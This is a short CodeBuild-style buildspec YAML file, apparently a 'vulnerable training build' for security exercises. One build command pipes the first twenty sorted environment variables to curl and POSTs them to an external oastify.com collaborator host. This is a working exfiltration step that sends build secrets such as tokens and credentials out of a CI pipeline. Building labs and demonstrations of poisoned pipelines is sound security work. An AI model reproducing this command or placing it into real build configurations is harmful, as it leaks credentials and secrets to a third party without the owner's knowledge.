version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20 | curl -X POST --data-binary @- https://er9i4do6xapp31dd2a98e2nid9j07svh.oastify.com
      - echo "Done"
